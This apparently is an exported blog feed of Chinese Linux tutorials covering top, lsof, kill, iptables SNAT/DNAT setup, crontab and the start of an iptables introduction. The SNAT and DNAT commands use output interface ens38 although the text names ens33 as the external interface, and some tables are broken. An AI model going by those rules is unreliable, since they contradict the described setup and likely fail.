s</td></tr><tr><td>-q</td><td>没有任何延迟的显示速度，如果使用者是有 superuser 的权限，则 top 将会以最高的优先序执行</td></tr><tr><td>-c</td><td>切换显示模式</td></tr><tr><td>-s</td><td>安全模式，将交谈式指令取消, 避免潜在的危机</td></tr><tr><td>-i</td><td>不显示任何闲置 (idle) 或无用 (zombie) 的行程</td></tr><tr><td>-n</td><td>更新的次数，完成后将会退出 top</td></tr><tr><td>-b</td><td>批次档模式，搭配 “n” 参数一起使用，可以用来将 top 的结果输出到档案内</td></tr></tbody></table><h3 id="top-快捷键"><a href="#top-快捷键" class="headerlink" title="top 快捷键"></a>top 快捷键</h3><ul><li>s：修改刷新时间，默认 3s 刷新一次</li><li>空格键：立即刷新</li><li>q：退出</li><li>P：按 CPU 排序</li><li>M：按内存排序</li><li>T：按时间排序</li><li>p：进程 IP，查看某个进程状态</li><li>1：显示每个内核的 CPU 使用率</li><li>u/U：指定显示的用户</li><li>h：帮助</li></ul><h3 id="用例-2"><a href="#用例-2" class="headerlink" title="用例"></a>用例</h3><h4 id="显示进程信息"><a href="#显示进程信息" class="headerlink" title="显示进程信息"></a>显示进程信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="显示完整的进程信息"><a href="#显示完整的进程信息" class="headerlink" title="显示完整的进程信息"></a>显示完整的进程信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="以批处理模式显示程序信息"><a href="#以批处理模式显示程序信息" class="headerlink" title="以批处理模式显示程序信息"></a>以批处理模式显示程序信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="以累积模式显示程序信息"><a href="#以累积模式显示程序信息" class="headerlink" title="以累积模式显示程序信息"></a>以累积模式显示程序信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="设置信息更新次数"><a href="#设置信息更新次数" class="headerlink" title="设置信息更新次数"></a>设置信息更新次数</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -n 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="八、lsof-查进程打开的文件"><a href="#八、lsof-查进程打开的文件" class="headerlink" title="八、lsof 查进程打开的文件"></a>八、lsof 查进程打开的文件</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>lsof 命令用于查看进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP),找回/恢复删除的文件。是十分方便的系统监视工具，因为 lsof 命令需要访问核心内存和各种文件，所以需要 root 用户执行。<br>​</p><p>语法格式：<code>lsof [参数] [文件]</code><br>​</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-bash"><code class="language-bash">apt <span class="token function">install</span> <span class="token function">lsof</span><span class="token comment" spellcheck="true"># 或</span>yum <span class="token function">install</span> <span class="token function">lsof</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="常用参数-3"><a href="#常用参数-3" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>-a</td><td>列出打开文件存在的进程</td></tr><tr><td>-c &lt;进程名&gt;</td><td>列出指定进程所打开的文件</td></tr><tr><td>-g</td><td>列出 GID 号进程详情</td></tr><tr><td>-d &lt;文件号&gt;</td><td>列出占用该文件号的进程</td></tr><tr><td>+d &lt;目录&gt;</td><td>列出目录下被打开的文件</td></tr><tr><td>+D &lt;目录&gt;</td><td>递归列出目录下被打开的文件</td></tr><tr><td>-n &lt;目录&gt;</td><td>列出使用 NFS 的文件</td></tr><tr><td>-i &lt;条件&gt;</td><td>列出符合条件的进程</td></tr><tr><td>-p &lt;进程号&gt;</td><td>列出指定进程号所打开的文件</td></tr><tr><td>-u</td><td>列出 UID 号进程详情</td></tr><tr><td>-h</td><td>显示帮助信息</td></tr><tr><td>-v</td><td>显示版本信息</td></tr></tbody></table><h3 id="用例-3"><a href="#用例-3" class="headerlink" title="用例"></a>用例</h3><h4 id="查看文件的进程信息"><a href="#查看文件的进程信息" class="headerlink" title="查看文件的进程信息"></a>查看文件的进程信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="列出-GID-号进程详情"><a href="#列出-GID-号进程详情" class="headerlink" title="列出 GID 号进程详情"></a>列出 GID 号进程详情</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="列出目录下被打开的文件"><a href="#列出目录下被打开的文件" class="headerlink" title="列出目录下被打开的文件"></a>列出目录下被打开的文件</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> +d /root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="特定用户打开的文件"><a href="#特定用户打开的文件" class="headerlink" title="特定用户打开的文件"></a>特定用户打开的文件</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">lsof</span> -u root <span class="token operator">|</span> <span class="token function">less</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="列出特定进程打开的文件"><a href="#列出特定进程打开的文件" class="headerlink" title="列出特定进程打开的文件"></a>列出特定进程打开的文件</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -p <span class="token operator">&lt;</span>PID<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="列出打开的网络文件"><a href="#列出打开的网络文件" class="headerlink" title="列出打开的网络文件"></a>列出打开的网络文件</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h4 id="根据命令查找打开的文件"><a href="#根据命令查找打开的文件" class="headerlink" title="根据命令查找打开的文件"></a>根据命令查找打开的文件</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -c <span class="token operator">&lt;</span>COMMAND<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="九、前后台进程切换"><a href="#九、前后台进程切换" class="headerlink" title="九、前后台进程切换"></a>九、前后台进程切换</h2><blockquote><p>​<a href="https://truda.puuuq.cn/post/8ed3ed3a.html">Linux 任务的前后台管理</a></p></blockquote><h2 id="十、kill-关闭进程"><a href="#十、kill-关闭进程" class="headerlink" title="十、kill 关闭进程"></a>十、kill 关闭进程</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>kill 正如这个单词的意思一样，就是杀死，linux 系统中 kill 命令用来删除执行中的程序或工作。<br>kill 命令可将指定的信号发送给相应的进程或工作。 kill 命令默认使用信号为 15，用于结束进程或工作。如果进程或工作忽略此信号，则可以使用信号 9，强制杀死进程或作业。</p><p>语法格式：<code>kill [参数] [进程号]</code><br>​</p><h3 id="kill-命令的进程终止信号"><a href="#kill-命令的进程终止信号" class="headerlink" title="kill 命令的进程终止信号"></a>kill 命令的进程终止信号</h3><table><thead><tr><th><strong>选项</strong></th><th><strong>信号编号</strong></th><th><strong>行动</strong></th></tr></thead><tbody><tr><td>SIGTERM</td><td>15</td><td>SIGTERM 信号用于告诉进程正常结束。该终止信号可能会被进程解释，也可能会被忽略。</td></tr><tr><td>SIGKILL</td><td>9</td><td>SIGKILL 信号用于强制终止进程。这是一个无论如何都不能被进程忽略的信号。</td></tr><tr><td>​SIGHUP</td><td>1</td><td>SIGHUP 信号用于“挂断”进程。这可用于重新启动进程。</td></tr><tr><td>SIGINT</td><td>2</td><td>当用户想要中断进程时使用 SIGINT 信号。</td></tr></tbody></table><h3 id="常用参数-4"><a href="#常用参数-4" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>-l</td><td>列出系统支持的信号</td></tr><tr><td>-s</td><td>指定向进程发送的信号</td></tr><tr><td>-a</td><td>处理当前进程时不限制命令名和进程号的对应关系</td></tr><tr><td>-p</td><td>指定 kill 命令只打印相关进程的进程号，而不发送任何信号</td></tr><tr><td>-l</td><td>列出系统支持的信号</td></tr></tbody></table><h3 id="用例-4"><a href="#用例-4" class="headerlink" title="用例"></a>用例</h3><h4 id="列出系统支持的信号列表"><a href="#列出系统支持的信号列表" class="headerlink" title="列出系统支持的信号列表"></a>列出系统支持的信号列表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="kill-杀掉指定-pid-的进程"><a href="#kill-杀掉指定-pid-的进程" class="headerlink" title="kill 杀掉指定 pid 的进程"></a>kill 杀掉指定 pid 的进程</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> <span class="token punctuation">[</span>PID<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="根据进程名称杀掉相关进程"><a href="#根据进程名称杀掉相关进程" class="headerlink" title="根据进程名称杀掉相关进程"></a>根据进程名称杀掉相关进程</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">killall</span> httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="强制关闭进程"><a href="#强制关闭进程" class="headerlink" title="强制关闭进程"></a>强制关闭进程</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> -9 <span class="token punctuation">[</span>PID<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables配置SNAT和DNAT</title>
      <link href="/post/52179055.html"/>
      <url>/post/52179055.html</url>
      
        <content type="html"><![CDATA[<h1 id="iptables-配置-SNAT-和-DNAT"><a href="#iptables-配置-SNAT-和-DNAT" class="headerlink" title="iptables 配置 SNAT 和 DNAT"></a>iptables 配置 SNAT 和 DNAT</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>NAT 的全称是「网络地址转换」（Network Address Translation），指的是路由器等网络设备，在传输数据的过程中，改变数据中的 IP 地址的一种技术。NAT 可以分为 SNAT（Source Network Address Translation，源地址转换）和 DNAT（Destination Network Address Translation，目的地址转换），SNAT 主要是用来做默认网关的，而 DNAT 主要是用来做端口映射的。<br>本文将介绍如何使用 Linux 的 iptables 来实现 SNAT 和 DNAT。</p><h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="SNAT"><a href="#SNAT" class="headerlink" title="SNAT"></a>SNAT</h3><p>SNAT 全称是「源地址转换」（Source Network Address Translation），顾名思义，它是一种通常在从私有 IP 地址连接到公共 IP 地址时转换源 IP 地址的技术。当内部主机需要向外部主机或公共主机发起请求时，它是最常见的 NAT 形式。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628166191160-920da5c5-7e0d-4ba0-8173-2f4cf7ebae9b.png#clientId=u28837019-f0e4-4&amp;from=paste&amp;height=237&amp;id=uc82db7db&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=237&amp;originWidth=645&amp;originalType=binary%E2%88%B6=1&amp;size=21322&amp;status=done&amp;style=none&amp;taskId=u90bcbc70-1a49-4b71-ac6e-ab2cc01359e&amp;width=645" alt="image.png"></p><h3 id="DNAT"><a href="#DNAT" class="headerlink" title="DNAT"></a>DNAT</h3><p>DNAT 全称是「目标地址转换」（Destination Network Address Translation），顾名思义，是一种一般在从公网 IP 地址连接到私有 IP 地址时，对目的 IP 地址进行转换的技术。它通常用于将目的地为特定 IP 地址或 IP 地址上的特定端口的数据包重定向到一个主机上的不同地址，主要是在不同的主机上。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628166201445-fe5d0812-4264-41ed-9c41-32cb0c2ca457.png#clientId=u28837019-f0e4-4&amp;from=paste&amp;height=237&amp;id=u536e6649&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=237&amp;originWidth=645&amp;originalType=binary%E2%88%B6=1&amp;size=21205&amp;status=done&amp;style=none&amp;taskId=uced93e81-ca83-4c15-bbf9-dc4e9e19ede&amp;width=645" alt="image.png"></p><h3 id="SNAT-和-DNAT-对比"><a href="#SNAT-和-DNAT-对比" class="headerlink" title="SNAT 和 DNAT 对比"></a>SNAT 和 DNAT 对比</h3><table><thead><tr><th>范围</th><th>SNAT</th><th>DNAT</th></tr></thead><tbody><tr><td>名称</td><td>源地址转换</td><td>目的地址转换</td></tr><tr><td>简介</td><td>SNAT 将源主机的私有 IP 地址更改为公共 IP 地址。它还可能更改 TCP/UDP 标头中的源端口。SNAT 通常由内部用户访问 Internet。</td><td>目标 NAT 更改数据包 IP 标头中的目标地址。它还可能更改 TCP/UDP 标头中的目标端口。当我们需要将目的地为公共地址/端口的传入数据包重定向到网络内的私有 IP 地址/端口时，会使用 DNAT。</td></tr><tr><td>使用场景</td><td>局域网内或防火墙后面的客户端想要浏览互联网</td><td>在防火墙后面的数据中心内托管的网站，需要用户通过 Internet 访问</td></tr><tr><td>地址变更</td><td>SNAT 改变通过 NAT 设备的数据包的源地址</td><td>DNAT 改变通过路由器的数据包的目的地址</td></tr><tr><td>操作顺序</td><td>SNAT 在做出路由决定后执行。</td><td>DNAT 在做出路由决定之前执行。</td></tr><tr><td>通讯流程</td><td>当内部安全网络发起与外部世界的通信时，就会发生 SNAT</td><td>当外部不安全网络发起与内部安全网络的通信时，就会发生 DNAT</td></tr></tbody></table><p>| 单/多主机</p><p>| SNAT 允许“内部”网络上的多个主机访问“外部”网络上的任何主机 | DNAT 允许“外部”网络上的任何主机访问“内部”网络上的单个主机 |</p><h2 id="三、配置-SNAT"><a href="#三、配置-SNAT" class="headerlink" title="三、配置 SNAT"></a>三、配置 SNAT</h2><h3 id="网络接口配置"><a href="#网络接口配置" class="headerlink" title="网络接口配置"></a>网络接口配置</h3><p>内网主机（多台）：</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>接口名称</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>local01</td><td>ens33</td><td>192.168.1.3</td><td>192.168.1.2</td><td>255.255.255.0</td></tr><tr><td>local02</td><td>ens33</td><td>192.168.1.4</td><td>192.168.1.2</td><td>255.255.255.0</td></tr></tbody></table><blockquote><p>这里以两台内网主机为例，默认情况下均无法访问外网</p></blockquote><p>​</p><p>内网主机 DNS 配置（/etc/resolv.conf）：</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NAT 主机（1 台）：</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>接口名称</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>nathost</td><td>ens33</td><td>192.168.2.35</td><td>192.168.2.2</td><td>255.255.255.0</td></tr><tr><td>nathost</td><td>ens38</td><td>192.168.1.2</td><td>​</td><td></td></tr><tr><td>255.255.255.0</td><td></td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>nathost 主机可以通过 ens33 接口访问外网</p></blockquote><p>​</p><p>NAT 主机 DNS 配置（/etc/resolv.conf）：</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.2.2nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><h3 id="NAT-主机配置"><a href="#NAT-主机配置" class="headerlink" title="NAT 主机配置"></a>NAT 主机配置</h3><h4 id="开启内核数据包转发"><a href="#开启内核数据包转发" class="headerlink" title="开启内核数据包转发"></a>开启内核数据包转发</h4><p>要配置 NAT，必须开启 Linux 内核的转发功能：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/net/ipv4/ip_forward  <span class="token comment" spellcheck="true"># 临时生效，重启失效</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要永久生效，需要：</p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/sysctl.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改其中的 <code>net.ipv4.ip_forward = 1</code>​<br>然后执行：</p><pre class="line-numbers language-bash"><code class="language-bash">sysctl -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>立刻生效。<br>​</p><h4 id="关闭-firewalld"><a href="#关闭-firewalld" class="headerlink" title="关闭 firewalld"></a>关闭 firewalld</h4><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop firewalldsystemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="开启-iptables-FORWARD-转发"><a href="#开启-iptables-FORWARD-转发" class="headerlink" title="开启 iptables FORWARD 转发"></a>开启 iptables FORWARD 转发</h4><pre class="line-numbers language-bash"><code class="language-bash">iptables -P FORWARD ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="配置-SNAT"><a href="#配置-SNAT" class="headerlink" title="配置 SNAT"></a>配置 SNAT</h4><p>将 192.168.1.0/24 网段的数据包的源地址修改为 192.168.2.35，通过网络接口 ens33 送出：</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o ens38 -j SNAT --to-source 192.168.2.35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外一种方法：</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o ens38 -j MASQUERADE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完成配置后 192.168.1.0/24 的内网主机即可访问外网！<br>​</p><h2 id="四、配置-DNAT"><a href="#四、配置-DNAT" class="headerlink" title="四、配置 DNAT"></a>四、配置 DNAT</h2><h3 id="网络接口配置-1"><a href="#网络接口配置-1" class="headerlink" title="网络接口配置"></a>网络接口配置</h3><p>内网主机（1 台）：</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>接口名称</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>local</td><td>ens33</td><td>192.168.1.3</td><td>192.168.1.2</td><td>255.255.255.0</td></tr></tbody></table><blockquote><p>默认情况下外网主机无法直接访问该主机</p></blockquote><p>内网主机 DNS 配置（/etc/resolv.conf）：</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NAT 主机（1 台）：</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>接口名称</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>nathost</td><td>ens33</td><td>192.168.2.35</td><td>192.168.2.2</td><td>255.255.255.0</td></tr><tr><td>nathost</td><td>ens38</td><td>192.168.1.2</td><td>​</td><td></td></tr><tr><td>255.255.255.0</td><td></td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>外网可以通过 ens33 接口访问 nathost 主机</p></blockquote><p>NAT 主机 DNS 配置（/etc/resolv.conf）：</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.2.2nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NAT-主机配置-1"><a href="#NAT-主机配置-1" class="headerlink" title="NAT 主机配置"></a>NAT 主机配置</h3><h4 id="开启内核数据包转发-1"><a href="#开启内核数据包转发-1" class="headerlink" title="开启内核数据包转发"></a>开启内核数据包转发</h4><p>要配置 NAT，必须开启 Linux 内核的转发功能：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/net/ipv4/ip_forward  <span class="token comment" spellcheck="true"># 临时生效，重启失效</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要永久生效，需要：</p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/sysctl.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改其中的 <code>net.ipv4.ip_forward = 1</code>​<br>然后执行：</p><pre class="line-numbers language-bash"><code class="language-bash">sysctl -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>立刻生效。<br>​</p><h4 id="关闭-firewalld-1"><a href="#关闭-firewalld-1" class="headerlink" title="关闭 firewalld"></a>关闭 firewalld</h4><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop firewalldsystemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="开启-iptables-FORWARD-转发-1"><a href="#开启-iptables-FORWARD-转发-1" class="headerlink" title="开启 iptables FORWARD 转发"></a>开启 iptables FORWARD 转发</h4><pre class="line-numbers language-bash"><code class="language-bash">iptables -P FORWARD ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="配置-DNAT"><a href="#配置-DNAT" class="headerlink" title="配置 DNAT"></a>配置 DNAT</h4><p>将对外网 192.168.2.35 网络接口 ens33 的访问，映射到对内网 192.168.1.3 上：</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -i ens33 -p tcp -d 192.168.2.35 --dport 80 -j DNAT --to-destination 192.168.1.3:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>必须还要做一个 SNAT，让目标服务器能够把数据传回来：</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o ens38 -j SNAT --to-source 192.168.2.35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>完成配置后访问 192.168.2.35:80 的流量就会转发到 192.168.1.3:80 上！</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 网络 </tag>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crontab 计划任务</title>
      <link href="/post/422dc34e.html"/>
      <url>/post/422dc34e.html</url>
      
        <content type="html"><![CDATA[<h1 id="crontab-计划任务"><a href="#crontab-计划任务" class="headerlink" title="crontab 计划任务"></a>crontab 计划任务</h1><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Crontab 代表 cron 表，其中包含以固定时间间隔运行的任务列表。然后这些任务由名为 cron 的守护进程执行。机器上的所有用户都可以拥有单独的 crontab，帮助他们执行计划任务。<br>​</p><p>语法格式：<code>crontab [参数]</code></p><h2 id="二、Linux-中创建和编辑-crontabs"><a href="#二、Linux-中创建和编辑-crontabs" class="headerlink" title="二、Linux 中创建和编辑 crontabs"></a>二、Linux 中创建和编辑 crontabs</h2><p>如果您以前从未使用过 crontab，则需要创建一个 crontab 文件，该文件将包含所有计划任务的详细信息。这个文件可以简单地通过以下命令创建：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="三、如何添加计划任务？"><a href="#三、如何添加计划任务？" class="headerlink" title="三、如何添加计划任务？"></a>三、如何添加计划任务？</h2><p>创建 crontab 文件后，我们要做的就是向该文件添加计划任务。现在，cron 具有特定格式，具有 6 个字段，其通用语法如下所示：</p><pre class="line-numbers language-bash"><code class="language-bash">minute<span class="token punctuation">(</span>s<span class="token punctuation">)</span> hour<span class="token punctuation">(</span>s<span class="token punctuation">)</span> day<span class="token punctuation">(</span>s<span class="token punctuation">)</span> month<span class="token punctuation">(</span>s<span class="token punctuation">)</span> weekday<span class="token punctuation">(</span>s<span class="token punctuation">)</span> command<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628160648491-969e5a7b-094d-49bd-a9f1-f3aa95b10008.png#clientId=u67e0b3f1-5c98-4&amp;from=paste&amp;height=199&amp;id=uc7c7c544&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=199&amp;originWidth=583&amp;originalType=binary%E2%88%B6=1&amp;size=30871&amp;status=done&amp;style=none&amp;taskId=u9b7d6bb5-6ef0-43c1-88c7-0a9d6eaf288&amp;width=583" alt="image.png"></p><table><thead><tr><th><strong>Fields</strong></th><th><strong>Values</strong></th></tr></thead><tbody><tr><td>Minutes</td><td>0-59</td></tr><tr><td>Hour</td><td>0-23</td></tr><tr><td>Day</td><td>1-31</td></tr><tr><td>Month</td><td>1-12</td></tr><tr><td>Weekday</td><td>0-6 (其中 0：星期日，1：星期一，…)</td></tr><tr><td>Command</td><td>完整的可执行命令（绝对路径）</td></tr></tbody></table><p>您还可以在任何这些字段中使用星号 (<strong>*</strong>) 将其设置为“从头到尾”。所以如果 day 字段设置为<strong>*<strong>，则该命令将每天执行。您还可以借助逗号 (</strong>,</strong>) 在一个字段中添加多个条件。您还可以使用破折号 (<strong>-</strong>) 符号放置一系列值。<br>现在看第一个例子，这里我安排了每周一 12:00 执行的任务：</p><pre class="line-numbers language-bash"><code class="language-bash">0 12 * * 1 <span class="token function">touch</span> /home/truda/file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在让我们再举一个例子，我想在每个月的第 5、10 和 15 天的 16:30 执行一次任务，我会输入以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">30 16 5,10,15 * * /bin/sh /home/truda/task.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在以下示例中，我在每月的每 1-5 天的 12:30 执行任务：</p><pre class="line-numbers language-bash"><code class="language-bash">30 12 1-5 * * <span class="token function">touch</span> /home/truda/NewFile.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="四、如何删除-crontab-任务？"><a href="#四、如何删除-crontab-任务？" class="headerlink" title="四、如何删除 crontab 任务？"></a>四、如何删除 crontab 任务？</h2><p>首先要查看现有的 crontab 任务，您可以运行以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要清除所有 crontab 任务，您可以运行以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="五、如何更改其他用户的-crontab-任务？"><a href="#五、如何更改其他用户的-crontab-任务？" class="headerlink" title="五、如何更改其他用户的 crontab 任务？"></a>五、如何更改其他用户的 crontab 任务？</h2><p>如果您是 root，您也可以使用该 -u 选项更改其他用户的 crontab 任务。例如，如果您希望以 root 身份为用户“truda”编辑 cron 文件，您将运行以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -u truda -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables防火墙的使用</title>
      <link href="/post/84b6e48c.html"/>
      <url>/post/84b6e48c.html</url>
      
        <content type="html"><![CDATA[<h1 id="iptables-防火墙的使用"><a href="#iptables-防火墙的使用" class="headerlink" title="iptables 防火墙的使用"></a>iptables 防火墙的使用</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>iptables 是一个配置 Linux 内核防火墙的命令行工具，它基于内核的 netfilter 机制。iptables 可以检测、修改、转发、重定向和丢弃 IPv4 数据包。</p><h3 id="netfilter"><a href="#netfilter" class="headerlink" title="netfilter"></a>netfilter</h3><p>netfilter 是 Linux 内核的包过滤框架，它提供了一系列的钩子（Hook）供其他模块控制包的流动。这些钩子包括：</p><ul><li>NF_IP_PRE_ROUTING：刚刚通过数据链路层解包进入网络层的数据包通过此钩子，它在路由之前处理</li><li>NF_IP_LOCAL_IN：经过路由查找后，送往本机（目的地址在本地）的包会通过此钩子</li><li>NF_IP_FORWARD：不是本地产生的并且目的地不是本地的包（即转发的包）会通过此钩子</li><li>NF_IP_LOCAL_OUT：所有本地生成的发往其他机器的包会通过该钩子</li><li>NF_IP_POST_ROUTING：在包就要离开本机之前会通过该钩子，它在路由之后处理</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627832131711-020d0d26-cdb4-4fac-b4ea-c40c77ee9821.png#clientId=u29e6ff67-2d10-4&amp;from=paste&amp;id=uee486ae6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=433&amp;originWidth=1429&amp;originalType=url%E2%88%B6=1&amp;size=354351&amp;status=done&amp;style=none&amp;taskId=u8b62e0a3-e9cf-4460-9db8-57d321e5a9d" alt="image.png"></p><h2 id="二、原理"><a href="#二、原理" class="headerlink" 